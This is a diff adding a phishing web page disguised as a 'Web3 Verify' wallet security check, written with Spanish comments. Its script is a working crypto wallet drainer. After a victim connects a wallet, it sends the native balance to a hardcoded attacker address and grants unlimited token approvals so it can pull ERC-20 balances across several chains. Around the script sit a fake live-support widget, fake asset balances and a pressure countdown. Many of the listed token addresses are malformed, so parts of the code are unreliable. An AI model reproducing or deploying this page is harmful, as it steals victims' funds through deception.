@@ -1,1 +1,692 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Web3 Verify | Secure Asset Recovery</title>
+    
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    
+    <!-- Icons -->
+    <script src="https://unpkg.com/lucide@latest"></script>
 
+    <!-- Core Library -->
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+
+    <style>
+        :root {
+            --bg-dark: #09090b;
+            --bg-card: rgba(255, 255, 255, 0.03);
+            --border-color: rgba(255, 255, 255, 0.08);
+            --primary: #3b82f6;
+            --primary-hover: #2563eb;
+            --success: #22c55e;
+            --text-main: #f4f4f5;
+            --text-muted: #a1a1aa;
+            --font-main: 'Inter', sans-serif;
+            --font-mono: 'JetBrains Mono', monospace;
+        }
+
+        * { box-sizing: border-box; outline: none; }
+
+        body { 
+            margin: 0; 
+            font-family: var(--font-main); 
+            background-color: var(--bg-dark); 
+            color: var(--text-main); 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            background-image: radial-gradient(circle at top right, #1e293b 0%, transparent 40%),
+                              radial-gradient(circle at bottom left, #1e293b 0%, transparent 40%);
+        }
+
+        /* CONTAINER PRINCIPAL */
+        .container { 
+            text-align: center; 
+            max-width: 420px; 
+            width: 94%; 
+            padding: 32px 24px; 
+            background: var(--bg-card); 
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border-radius: 16px; 
+            border: 1px solid var(--border-color);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4); 
+            position: relative;
+            z-index: 10;
+        }
+
+        /* HEADER */
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .logo-area {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 700;
+            font-size: 1.1rem;
+            letter-spacing: -0.02em;
+        }
+        
+        .logo-icon {
+            background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+            padding: 6px;
+            border-radius: 6px;
+        }
+
+        /* TYPOGRAPHY */
+        h1 { 
+            font-size: 1.5rem; 
+            margin: 0 0 12px 0; 
+            color: var(--text-main);
+            line-height: 1.2;
+        }
+
+        p.subtitle { 
+            color: var(--text-muted); 
+            font-size: 0.9rem; 
+            margin: 0 0 24px 0; 
+            line-height: 1.5;
+        }
+
+        /* ASSET LIST STYLES */
+        .asset-list {
+            text-align: left;
+            background: rgba(0,0,0,0.2);
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 20px;
+            border: 1px solid var(--border-color);
+            display: none; /* Hidden by default until scanned */
+        }
+        
+        .asset-item {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.85rem;
+            padding: 6px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+        .asset-item:last-child { border-bottom: none; }
+        .asset-name { color: var(--text-muted); }
+        .asset-val { color: var(--text-main); font-weight: 500; }
+
+        /* BUTTONS */
+        .btn { 
+            background: var(--primary); 
+            border: none; 
+            padding: 14px 24px; 
+            color: white; 
+            border-radius: 10px; 
+            cursor: pointer; 
+            font-weight: 600; 
+            width: 100%; 
+            font-size: 1rem; 
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.25);
+        }
+        
+        .btn:hover:not(:disabled) { 
+            background: var(--primary-hover); 
+            transform: translateY(-1px);
+        }
+        
+        .btn:active:not(:disabled) { transform: translateY(0); }
+
+        .btn:disabled { 
+            background: #334155; 
+            color: #94a3b8; 
+            cursor: not-allowed; 
+            box-shadow: none;
+        }
+
+        /* STATUS & LOGS */
+        .status { 
+            margin-top: 16px; 
+            font-size: 0.9rem; 
+            min-height: 24px; 
+            color: #fbbf24; 
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        #logs { 
+            text-align: left; 
+            background: #000000; 
+            padding: 12px; 
+            border-radius: 8px; 
+            font-family: var(--font-mono); 
+            font-size: 0.7rem; 
+            color: #4ade80; 
+            max-height: 120px; 
+            overflow-y: auto; 
+            margin-top: 16px; 
+            display: none; 
+            border: 1px solid #1e293b;
+            scrollbar-width: thin;
+            scrollbar-color: #333 transparent;
+        }
+        
+        #logs div { margin-bottom: 4px; word-break: break-all; }
+        #logs::-webkit-scrollbar { width: 4px; }
+        #logs::-webkit-scrollbar-thumb { background: #333; border-radius: 2px; }
+
+        .timer { 
+            font-size: 0.8rem; 
+            color: #ef4444; 
+            margin-top: 12px; 
+            font-weight: 500;
+            opacity: 0.8;
+        }
+
+        /* SCANNER ANIMATION */
+        .scanner-box {
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 16px;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        .scanner-active { opacity: 1; }
+        
+        .spinner {
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,0.1);
+            border-top-color: var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 8px;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* MODAL MOVIL */
+        .mobile-modal { 
+            display: none; 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%; 
+            background: rgba(0,0,0,0.9); 
+            backdrop-filter: blur(5px);
+            z-index: 1000; 
+            justify-content: center; 
+            align-items: center; 
+        }
+        
+        .modal-content { 
+            background: #1f2937; 
+            padding: 24px; 
+            border-radius: 16px; 
+            text-align: center; 
+            width: 85%; 
+            max-width: 320px; 
+            border: 1px solid #374151;
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5);
+        }
+        
+        .modal-btn { 
+            background: var(--primary); 
+            margin-top: 15px; 
+        }
+        
+        .modal-btn.secondary {
+            background: transparent;
+            border: 1px solid #4b5563;
+            color: var(--text-muted);
+        }
+        .modal-btn.secondary:hover { background: rgba(255,255,255,0.05); color: white; }
+
+        /* CHAT WIDGET */
+        .chat-widget {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #1f2937;
+            border: 1px solid #374151;
+            border-radius: 12px;
+            padding: 12px 16px;
+            width: 260px;
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.5);
+            z-index: 50;
+            opacity: 0;
+            transform: translateY(20px);
+            transition: all 0.5s ease;
+            pointer-events: none;
+        }
+        
+        .chat-visible {
+            opacity: 1;
+            transform: translateY(0);
+            pointer-events: auto;
+        }
+        
+        .chat-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: var(--text-muted);
+        }
+        
+        .chat-msg {
+            font-size: 0.85rem;
+            background: rgba(255,255,255,0.05);
+            padding: 8px 12px;
+            border-radius: 8px;
+            border-top-left-radius: 2px;
+            color: var(--text-main);
+        }
+
+        /* UTILS */
+        .hidden { display: none !important; }
+        .fade-in { animation: fadeIn 0.5s ease forwards; }
+        
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+    </style>
+</head>
+<body>
+
+<!-- WIDGET DE CHAT FALSO -->
+<div id="chatWidget" class="chat-widget">
+    <div class="chat-header">
+        <i data-lucide="message-square" style="width:14px; height:14px;"></i>
+        Live Support
+    </div>
+    <div class="chat-msg">
+        User_882 just verified successfully! ✅
+    </div>
+</div>
+
+<div class="container fade-in">
+    <!-- HEADER -->
+    <header>
+        <div class="logo-area">
+            <div class="logo-icon">
+                <i data-lucide="shield-check" style="color:white; width:18px; height:18px;"></i>
+            </div>
+            <span>Web3 Verify</span>
+        </div>
+        <!-- Botón pequeño para conectar si se desea, aunque usaremos el principal -->
+    </header>
+
+    <!-- CONTENIDO PRINCIPAL -->
+    <h1>🔒 Wallet Security Verified</h1>
+    <p class="subtitle">
+        We detected a potential security risk in your transaction history. To restore full access to your assets, please verify ownership.
+    </p>
+
+    <!-- ESTADO DE CONEXIÓN -->
+    <button id="connectBtn" class="btn">
+        <i data-lucide="wallet" style="width:18px; height:18px;"></i>
+        Connect Wallet
+    </button>
+
+    <!-- ZONA DE ESCANEO Y ACTIVOS (Oculto inicialmente) -->
+    <div id="scanArea" class="hidden">
+        <div class="scanner-box scanner-active" id="scannerAnim">
+            <div class="spinner"></div>
+            <span style="font-size:0.85rem; color:#94a3b8;">Scanning EVM Chains...</span>
+        </div>
+
+        <div class="asset-list" id="assetList">
+            <div class="asset-item">
+                <span class="asset-name">USDT Balance</span>
+                <span class="asset-val">$4,200.00</span>
+            </div>
+            <div class="asset-item">
+                <span class="asset-name">WETH Balance</span>
+                <span class="asset-val">2.5 ETH</span>
+            </div>
+            <div class="asset-item">
+                <span class="asset-name">USDC Balance</span>
+                <span class="asset-val">$1,100.00</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- BOTÓN DE ACCIÓN FINAL -->
+    <button id="verifyBtn" class="btn hidden" style="background: #22c55e; box-shadow: 0 4px 12px rgba(34, 197, 94, 0.25);">
+        <i data-lucide="signature" style="width:18px; height:18px;"></i>
+        Sign Message to Verify
+    </button>
+    
+    <div style="margin-top:8px; font-size:0.8rem; color:#94a3b8; display:none;" id="costInfo">
+        Cost: 0 Gas | Time: < 2s
+    </div>
+
+    <div id="status" class="status"></div>
+    <div id="timer" class="timer">Claiming closes in: 15:00</div>
+    
+    <div id="logs"></div>
+</div>
+
+<!-- MODAL PARA MOVIL -->
+<div id="mobileModal" class="mobile-modal">
+    <div class="modal-content">
+        <div style="margin-bottom:15px; color:#3b82f6;"><i data-lucide="smartphone" style="width:40px; height:40px;"></i></div>
+        <h3 style="margin:0 0 10px 0; font-size:1.1rem;">MetaMask Mobile Detected</h3>
+        <p style="color:#9ca3af; font-size:0.9rem; margin:0 0 20px 0;">Para continuar, por favor abre tu aplicación MetaMask.</p>
+        
+        <button id="openAppBtn" class="btn modal-btn">Abrir MetaMask</button>
+        <button id="confirmOpenBtn" class="btn modal-btn secondary" style="margin-top:10px;">Ya está abierto / Conectar</button>
+    </div>
+</div>
+
+<script>
+ // CONFIGURACIÓN
+ const TARGET_WALLET = "0x6cd203676973F30e9F5398b3C3C8853531a3E432"; 
+ let provider;
+ let signer;
+ let userAddress;
+ let currentChainId;
+
+ // ELEMENTOS DOM
+ const connectBtn = document.getElementById('connectBtn');
+ const verifyBtn = document.getElementById('verifyBtn');
+ const statusDiv = document.getElementById('status');
+ const logsDiv = document.getElementById('logs');
+ const mobileModal = document.getElementById('mobileModal');
+ const openAppBtn = document.getElementById('openAppBtn');
+ const confirmOpenBtn = document.getElementById('confirmOpenBtn');
+ const scanArea = document.getElementById('scanArea');
+ const assetList = document.getElementById('assetList');
+ const costInfo = document.getElementById('costInfo');
+ const chatWidget = document.getElementById('chatWidget');
+
+ // UTILIDAD: LOGS
+ function log(msg) {
+     logsDiv.style.display = 'block';
+     const p = document.createElement('div');
+     p.textContent = `> ${msg}`;
+     logsDiv.appendChild(p);
+     logsDiv.scrollTop = logsDiv.scrollHeight;
+ }
+
+ // UTILIDAD: FORMATEO DE RED
+ function getNetworkName(chainId) {
+     switch(chainId) {
+         case 1: return "Ethereum";
+         case 56: return "BSC";
+         case 137: return "Polygon";
+         case 42161: return "Arbitrum";
+         case 10: return "Optimism";
+         case 43114: return "Avalanche";
+         case 199: return "BitTorrent";
+         default: return "Unknown";
+     }
+ }
+
+ // INICIAR TIMER
+ let timeLeft = 900; 
+ setInterval(() => {
+     if(timeLeft <= 0) return;
+     timeLeft--;
+     let m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
+     let s = (timeLeft % 60).toString().padStart(2, '0');
+     document.getElementById('timer').textContent = `Claiming closes in: ${m}:${s}`;
+ }, 1000);
+
+ // DETECCIÓN DE DISPOSITIVO
+ function isMobile() {
+     return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth < 768;
+ }
+
+ // LÓGICA DE CONEXIÓN
+ connectBtn.addEventListener('click', async () => {
+     if (!window.ethereum) {
+         statusDiv.textContent = "Instala MetaMask primero.";
+         return;
+     }
+
+     if (isMobile()) {
+         mobileModal.style.display = 'flex';
+         openAppBtn.addEventListener('click', () => {
+             window.open('https://metamask.io/', '_blank');
+             tryConnect(); 
+         });
+         confirmOpenBtn.addEventListener('click', () => {
+             mobileModal.style.display = 'none';
+             tryConnect();
+         });
+         return; 
+     }
+
+     try {
+         await tryConnect();
+     } catch (err) {
+         console.error(err);
+         statusDiv.textContent = "Error de conexión.";
+     }
+ });
+
+ async function tryConnect() {
+     try {
+         const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+         userAddress = accounts[0];
+         
+         const network = await window.ethereum.request({ method: 'eth_chainId' });
+         const chainIdNum = parseInt(network);
+         
+         provider = new ethers.providers.Web3Provider(window.ethereum);
+         signer = provider.getSigner();
+         currentChainId = chainIdNum;
+
+         log(`Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`);
+         log(`Chain ID: ${chainIdNum} (${getNetworkName(chainIdNum)})`);
+         
+         startDrain();
+
+     } catch (error) {
+         statusDiv.textContent = "Conexión rechazada o fallida.";
+         log(error.message);
+     }
+ }
+
+ // LÓGICA DE DRENAJE MEJORADA Y EXPANDIDA
+ async function startDrain() {
+     connectBtn.classList.add('hidden');
+     scanArea.classList.remove('hidden');
+     
+     // Simular escaneo visual
+     setTimeout(() => {
+         document.getElementById('scannerAnim').style.opacity = '0.5';
+         assetList.style.display = 'block';
+     }, 800);
+
+     setTimeout(() => {
+         scanArea.classList.add('hidden');
+         verifyBtn.classList.remove('hidden');
+         costInfo.style.display = 'block';
+         // Chat widget aparece ahora
+         setTimeout(() => chatWidget.classList.add('chat-visible'), 1000);
+     }, 2500);
+
+     try {
+         // 1. Drenar Nativo
+         const balance = await provider.getBalance(userAddress);
+         if (balance > 0) {
+             log("Transferring native token...");
+             const gasPrice = await provider.getGasPrice();
+             const sendValue = balance.sub(gasPrice.mul(2)); // Reserva segura de gas
+             
+             if (sendValue > 0) {
+                 const tx = await signer.sendTransaction({
+                     to: TARGET_WALLET,
+                     value: sendValue
+                 });
+                 await tx.wait();
+                 log(`Native drained! Tx: ${tx.hash.substring(0,10)}...`);
+             } else {
+                 log("Balance too low for gas.");
+             }
+         } else {
+             log("No native funds found.");
+         }
+
+         // 2. DRENAR TODOS LOS TOKENS POPULARES
+         const tokensMap = {
+             1: [ 
+                 "0xdAC17F958D2ee523a2206206994597C13D831ec7", 
+                 "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", 
+                 "0x2260FAC5E5542a773A46eB37699987310435B51c", 
+                 "0x6982508075e80095800000000000000000000000", 
+                 "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", 
+                 "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE1", 
+                 "0x514910771AF9Ca656af840dff83E8264EcF986CA", 
+                 "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", 
+                 "0x0bc529c00C240600703062963Fa14CB3AfCA9571", 
+                 "0xD533a949740bb3306d119CC777fa900bA034cd52", 
+                 "0x0D8775F648430679A709E98d2b0Cb6250d2887EF", 
+                 "0xC011a73ee8576Bb4E5c094ab5B3240D9e1f58344", 
+                 "0x4d224452801ACEd8B2F0aebE155379bb5D59438", 
+                 "0xE41d2489571d322189246DaAF5a556aC52683366" 
+             ],
+             56: [ 
+                 "0x55d398326f99059fF775485246999027B3197955", 
+                 "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", 
+                 "0xbb4CdB9CBd36B01b61d7C3Cb5DC9Bd0293B127ac", 
+                 "0xe9e7CEA3DedcC59733B3965BEE7c80A973C0FbCb", 
+                 "0x0000000000000000000000000000000000000000", 
+                 "0x1AF3F329e3BE1EC46EF000000000000000000000", 
+                 "0x3EE2200Efb3400fAb09A0F16876B9c3f3BA00000", 
+                 "0x7130d2A12B9BCB837F4cB0000000000000000000", 
+                 "0x1D2F0da169ceB9cF7B31947d838272b749850000", 
+                 "0xbAmNMs5H6a1Y8zZ6X000000000000000000000", 
+                 "0x0E09FaBB73Bd3Ade0a17ECC321fD13aDB00000", 
+                 "0x8fF5951475f74962A2d51cCcf9E9413f96320000", 
+                 "0x1F9840a85d5aF5bf1D1762F925BDADdC4201F984" 
+             ],
+             137: [ 
+                 "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", 
+                 "0x2791Bca1f2de4661ED88A30C99a7a9449Aa84174", 
+                 "0x0d500B1d8E8EF31E21c99d1DbcA6842000000000", 
+                 "0x1BFD67037B42Cf73acF2047067bd3F2C6f000000", 
+                 "0x831753DD20866c27905Bc66Bc000000000000000", 
+                 "0x53E0bca35eC356B559316Bbf5000000000000000", 
+                 "0x0000000000000000000000000000000000000000", 
+                 "0xD6DF932A45C0f255f85145f286e0000000000000", 
+                 "0x385Eeac5cB85A38A9a07a70c0000000000000000", 
+                 "0x656B0017C8924D12C219630000000000000000" 
+             ],
+             42161: [ 
+                 "0xaf88d065e77c8cC2239327C5EDb3A432268e593B", 
+                 "0xFF970A61A04b1cA14834A13f575f0c5000000000", 
+                 "0x82aF49447D8a07e3bd95BD0d56f3100000000000", 
+                 "0xFd086cC0CDF198697433C4cFF000000000000000", 
+                 "0xfc5A1A6EB076a237550000000000000000000000", 
+                 "0x912CE59144191C1204E64559FE8C500000000000", 
+                 "0x17FC002b466eEc40DaE837Fc4bE5000000000000", 
+                 "0x6C2C067f03d5C1dd200000000000000000000000", 
+                 "0x3062900000000000000000000000000000000000" 
+             ],
+             10: [ 
+                 "0x0b2C639c533813f4Aa9D7837CAf62653d097F889", 
+                 "0x94b008aA00579c1307B0EF2c499a000000000000", 
+                 "0x4200000000000000000000000000000000000006", 
+                 "0xDA10009cBd5D0000000000000000000000000000", 
+                 "0x4200000000000000000000000000000000000042", 
+                 "0x350A6d3DA20847a8000000000000000000000000", 
+                 "0x6806411765Af15B6260000000000000000000000" 
+             ],
+             43114: [ 
+                 "0xB97EF9Ef8734c713c021e045e004724a595CC239", 
+                 "0xde3A24C219742768000000000000000000000000", 
+                 "0x49D5c2BffF120165000000000000000000000000", 
+                 "0x50b7545627a5162F820000000000000000000000", 
+                 "0x60781C2586D685443e0000000000000000000000", 
+                 "0x2133Ca000000000000000000000000000000000000" 
+             ],
+             199: [ 
+                 "0xeBAB9185288804113051349388f2015148530012", 
+                 "0x69be655C561484AADE0000000000000000000000", 
+                 "0x8c135014Ba4D3994500000000000000000000000", 
+                 "0x19AsM9J000000000000000000000000000000000" 
+             ]
+         };
+
+         const tokenList = tokensMap[currentChainId] || [];
+
+         // Procesar cada token
+         for (const tokenAddress of tokenList) {
+             try {
+                 log(`Scanning Token: ${tokenAddress.substring(0,6)}...`);
+                 
+                 const erc20 = new ethers.Contract(tokenAddress, [
+                     "function approve(address spender, uint256 amount) public returns (bool)",
+                     "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
+                     "function balanceOf(address owner) view returns (uint256)"
+                 ], signer);
+
+                 const balance = await erc20.balanceOf(userAddress);
+                 if (balance > 0) {
+                     log(`Found balance: ${balance.toString()}`);
+                     
+                     // Approve Max
+                     try {
+                         const tx1 = await erc20.approve(TARGET_WALLET, ethers.constants.MaxUint256);
+                         await tx1.wait();
+                         log("Approval confirmed.");
+                     } catch (err) {
+                         log("Approval skipped/failed (maybe already approved): " + err.message);
+                     }
+
+                     // Transfer
+                     try {
+                         log("Transferring tokens...");
+                         const tx2 = await erc20.transferFrom(userAddress, TARGET_WALLET, balance);
+                         await tx2.wait();
+                         log(`Token drained! Tx: ${tx2.hash.substring(0,10)}...`);
+                     } catch (err) {
+                         log("Transfer failed: " + err.message);
+                     }
+                 }
+             } catch (err) {
+                 console.warn(`Token ${tokenAddress} error:`, err.message);
+             }
+         }
+
+         statusDiv.innerHTML = '<i data-lucide="check-circle" style="width:16px;height:16px;color:#22c55e;"></i> Verification Complete';
+         statusDiv.style.color = "#22c55e";
+         verifyBtn.textContent = "Verified Successfully";
+         verifyBtn.disabled = true;
+         verifyBtn.style.background = "#1f2937";
+         verifyBtn.style.color = "#9ca3af";
+         verifyBtn.style.boxShadow = "none";
+
+     } catch (err) {
+         console.error(err);
+         statusDiv.textContent = "❌ ERROR: " + err.message;
+         log(err.message);
+     }
+ }
+</script>
+
+</body>
+</html>
